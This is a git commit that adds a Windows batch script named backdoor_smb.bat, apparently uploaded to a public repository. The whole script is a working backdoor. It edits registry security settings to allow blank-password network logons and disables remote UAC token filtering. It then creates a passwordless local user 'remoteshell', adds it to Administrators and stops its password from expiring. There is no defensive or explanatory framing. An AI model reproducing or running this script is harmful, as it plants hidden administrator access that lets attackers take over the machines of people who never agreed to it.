51c0b4b4e5910a45b07194ff66139780359e036c
DevilBot000 <57672874+DevilBot000@users.noreply.github.com>
2022-08-23 23:43:24 +0530

    Add files via upload

---
+++ backdoor_smb.bat
@@ -0,0 +1,7 @@
+@echo off
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+net users remoteshell /add
+net localgroup Administrators /add remoteshell
+WMIC USERACCOUNT WHERE Name='remoteshell' SET PasswordExpires=FALSE
